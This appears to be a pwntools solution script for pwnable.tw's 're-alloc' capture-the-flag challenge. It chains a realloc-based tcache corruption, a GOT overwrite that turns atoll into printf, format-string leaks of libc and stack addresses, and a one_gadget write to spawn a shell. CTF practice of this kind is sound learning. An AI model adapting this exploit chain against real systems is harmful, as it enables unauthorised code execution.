from pwn import *

io = remote('chall.pwnable.tw', 10106)

libc = ELF('./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so')
elf = ELF('./re-alloc')

def alloc(index, size, data):
    io.recvuntil('Your choice: ')
    io.sendline('1')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Size:')
    io.sendline(str(size))
    io.recvuntil('Data:')
    io.send(data)

def realloc(index, size, data):
    io.recvuntil('Your choice: ')
    io.sendline('2')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Size:')
    io.sendline(str(size))
    if size == 0:
        return
    io.recvuntil('Data:')
    io.send(data)

def free(index):
    io.recvuntil('Your choice: ')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(index))

def fmt_read(index):
    io.recvuntil('Your choice: ')
    io.sendline('1')
    io.recvuntil('Index:')
    io.send('%{}$016lx'.format(index))
    return io.recv(16)

def fmt_write(index, value):
    io.recvuntil('Your choice: ')
    io.sendline('1')
    io.recvuntil('Index:')
    io.send('%{}c%{}$hhn'.format(value, index).ljust(16))

def leave():
    io.recvuntil('Your choice: ')
    io.sendline('4')

# double free error
alloc(0, 0x18, b'A')
realloc(0, 0, b'')
realloc(0, 0x18, p64(0) + p64(0))
free(0)
alloc(0, 0x18, p64(elf.got['atoll']) + p64(0))
alloc(1, 0x18, b'A')
realloc(1, 0x28, b'A')
free(1)
# change got address of atoi to printf
# now, the challenge turns into a fmt exploitation challenge
alloc(1, 0x18, p64(elf.plt['printf']))

# leak libc address and stack address
libc.address = int(fmt_read(23), 16) - 0x26b6b
stack_address = int(fmt_read(18), 16)

# write got address of _exit to stack
for i in range(3):
    fmt_write(12, (stack_address & 0xff) + i)
    fmt_write(18, p64(elf.got['_exit'])[i])

# overwrite got address of _exit with one_gadget
one_gadget = libc.address + 0xe2383
fmt_write(12, stack_address & 0xff)
for i in range(6):
    fmt_write(18, (elf.got['_exit'] & 0xff) + i)
    fmt_write(22, p64(one_gadget)[i])

# trigger one_gadget
leave()

io.interactive()
